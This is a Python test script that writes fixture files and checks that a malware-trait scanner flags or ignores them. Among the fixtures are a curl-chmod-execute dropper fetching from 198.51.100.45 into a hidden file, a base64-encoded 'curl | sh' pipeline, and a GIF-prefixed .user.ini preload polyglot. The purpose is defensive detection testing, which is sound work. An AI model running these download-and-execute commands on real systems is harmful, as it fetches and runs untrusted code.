#!/usr/bin/env python3
"""Exercise merged scope coverage, relocated operations, and password markup."""
import argparse
import json
import subprocess
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
SERVICES = 'micro-behaviors/communications/http/services/'
PROVIDERS = [
    ('1rpc', 'ethereum-1rpc-provider', '1rpc.io/eth'),
    ('1rpc', 'ethereum-1rpc-path-fragment', 'pc.io/eth'),
    ('ankr', 'ethereum-ankr-provider', 'rpc.ankr.com/eth'),
    ('aptos', 'aptos-fullnode-provider', 'fullnode.mainnet.aptoslabs.com'),
    ('blastapi', 'ethereum-blastapi-provider', 'eth-mainnet.public.blastapi.io'),
    ('blockpi', 'ethereum-blockpi-provider', 'ethereum.blockpi.network/public'),
    ('bloxroute', 'ethereum-blxrbdn-provider', 'uk.rpc.blxrbdn.com'),
    ('bnb-chain', 'bsc-bnbchain-provider', 'bnbchain.org'),
    ('cloudflare', 'ethereum-cloudflare-provider', 'cloudflare-eth.com'),
    ('defibit', 'bsc-defibit-provider', 'bsc-dataseed1.defibit.io'),
    ('drpc', 'ethereum-drpc-provider', 'eth.drpc.org'),
    ('drpc', 'ethereum-drpc-host-fragment', 'h.drpc.org'),
    ('getblock', 'ethereum-getblock-provider', 'go.getblock.io'),
    ('llamarpc', 'ethereum-llamarpc-provider', 'eth.llamarpc.com'),
    ('meowrpc', 'ethereum-meowrpc-provider', 'eth.meowrpc.com'),
    ('mev-blocker', 'ethereum-mevblocker-provider', 'rpc.mevblocker.io'),
    ('nodereal', 'ethereum-nodereal-provider', 'eth-mainnet.nodereal.io'),
    ('publicnode', 'bsc-publicnode-provider', 'bsc-rpc.publicnode.com'),
    ('publicnode', 'ethereum-publicnode-provider', 'ethereum.publicnode.com'),
    ('solana', 'solana-rpc-url', 'api.mainnet-beta.solana.com'),
]


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--cleave', type=Path, default=ROOT / '../cleave/target/release/cleave')
    args = parser.parse_args()
    cases = {}

    def add(name, text, required=(), forbidden=()):
        cases[name] = (text, set(required), set(forbidden))

    password = 'micro-behaviors/ui/controls/credential::password-input-field'
    add('password.html', '<html><input type="password"></html>', [password])
    add('commented-password.html', '<html><!-- <input type="password"> --><input type="text"></html>', forbidden=[password])
    add('mixed-password.html', '<html><!-- <input type="password"> --><input type=password></html>', [password])
    required = [f'{SERVICES}{provider}::{identifier}' for provider, identifier, _ in PROVIDERS]
    required.append('micro-behaviors/fs/path/basename::config-header-filename')
    strings = [url for _, _, url in PROVIDERS] + ['configs.h', 'curl ... | bash']
    literals = ', '.join(json.dumps(value) for value in strings)
    for filename, text in [
        ('providers.js', f'const providers = [{literals}];\nconsole.log(providers);\n'),
        ('providers.rb', f'providers = [{literals}]\nputs providers\n'),
        ('providers.py', f'providers = [{literals}]\nprint(providers)\n'),
        ('providers.c', '#include <stdio.h>\nconst char *providers[] = {' + literals + '};\nint main(int argc, char **argv) { puts(providers[argc % 22]); return 0; }\n'),
    ]:
        add(filename, text, required + ['metadata/package/documentation/source::abbreviated-curl-bash-reference'])
    documentation = 'metadata/package/documentation/source::abbreviated-curl-bash-reference'
    add('abbreviated.md', '# Example\n`curl ... | bash`\n', [documentation])
    add('abbreviated.rtf', r'{\rtf1\ansi curl ... | bash}', [documentation])
    add('computed-constructor.js', 'const instance = new (constructors[select()])();\n',
        ['micro-behaviors/data/control-flow/dispatch/computed::computed-receiver-new-constructor'])
    add('computed-navigator.js', 'navigator[family][method]();\n',
        ['micro-behaviors/data/control-flow/dispatch/computed::browser-computed-navigator-member-call'])
    add('indexed-return.js', 'function choose(results) { return results[0]; }\n',
        ['micro-behaviors/data/control-flow/return::indexed-results-return'])
    add('getter.js', 'const proxy = new Proxy(target, {get(object, key) { return object[key]; }});\n',
        ['micro-behaviors/data/property/define::js-proxy-get-trap'])
    add('reporting.js', 'function collect(value) {}\nfunction report(input) { collect(input.value); }\n',
        ['micro-behaviors/data/control-flow/direct-call::value-property-direct-reporting-call'])
    add('unrelated-reporting.js', 'function collect(value) {}\nfunction report(input) { const copied = input.value; collect("fixed"); }\n',
        forbidden=['micro-behaviors/data/control-flow/direct-call::value-property-direct-reporting-call'])

    hidden = 'objectives/execution/payload/file-exec/command/hidden-file::shell-ip-hidden-chmod-execution'
    chain = 'curl -sSL http://198.51.100.45/tool -o ~/.cache-tool && chmod +x ~/.cache-tool && ~/.cache-tool\n'
    add('hidden-dropper.sh', chain, [hidden])
    add('different-launch.sh', chain.replace('&& ~/.cache-tool', '&& ~/different-tool'), forbidden=[hidden])
    add('commented-dropper.sh', '# ' + chain, forbidden=[hidden])
    add('shadowed-curl.sh', 'curl() { printf "%s" "$1"; }\n' + chain, forbidden=[hidden])
    encoded = 'micro-behaviors/process/create/shell/encoded::literal-base64-decoded-shell-pipeline'
    pipeline = "printf '%s' 'Y3VybCAtZnNTTCBodHRwczovL2V4YW1wbGUuY29tL3NjcmlwdC5zaCB8IHNo' | base64 -d | sh\n"
    add('decoded-shell.sh', pipeline, [encoded])
    add('decoded-data.sh', pipeline.replace('| sh', '| cat'), forbidden=[encoded])
    add('shadowed-base64.sh', 'base64() { printf "%s" "$1"; }\n' + pipeline, forbidden=[encoded])
    polyglot = 'objectives/evasion/masquerade/file/polyglot::image-marked-user-ini-preload'
    add('php-conf/.user.ini', 'GIF89a\nauto_prepend_file=helper.png\n', [polyglot])
    add('plain-conf/.user.ini', 'auto_prepend_file=helper.png\n', forbidden=[polyglot])
    kotlin_xor = 'micro-behaviors/data/bitwise/xor::kotlin-infix-xor-expression'
    add('infix-xor.kt', 'fun mask(input: Int, key: Int): Int = input xor key\n', [kotlin_xor])
    add('infix-other.kt', 'fun transform(input: Int, xor: Int): Int = input custom xor\n', forbidden=[kotlin_xor])
    add('commented-xor.kt', '// input xor key\nval mask = "input xor key"\n', forbidden=[kotlin_xor])
    add('shadowed-xor.kt', 'infix fun Int.xor(other: Int): Int = other\nfun mask(input: Int): Int = input xor 0\n', forbidden=[kotlin_xor])

    with tempfile.TemporaryDirectory(prefix='validation-repair-controls-') as temporary:
        work = Path(temporary)
        for filename, (text, _, _) in cases.items():
            (work / filename).parent.mkdir(parents=True, exist_ok=True)
            (work / filename).write_text(text)
        subprocess.run(['cc', '-O0', '-o', str(work / 'providers.elf'), str(work / 'providers.c')], check=True)
        cases['providers.elf'] = ('', set(required), set())
        result = subprocess.run([str(args.cleave.resolve()), '--traits-dir', str(ROOT), '--format', 'json', '--all-files', str(work)],
                                text=True, capture_output=True, check=True)
        reports = {str(Path(report['path']).relative_to(work)): report for line in result.stdout.split('\n')
                   if line.strip() for report in json.loads(line)['files']}
        failures = []
        for name, (_, expected, forbidden) in cases.items():
            if name not in reports:
                failures.append(f'{name}: missing report')
                continue
            found = {finding['id'] for finding in reports[name].get('traits', [])}
            if missing := expected - found:
                failures.append(f'{name}: missing {sorted(missing)}')
            if unexpected := forbidden & found:
                failures.append(f'{name}: unexpected {sorted(unexpected)}')
        assert not failures, '\n'.join(failures)
        print(f'{len(cases)} validation repair controls passed (20 RPC providers across source, Ruby, and ELF).')


if __name__ == '__main__':
    main()
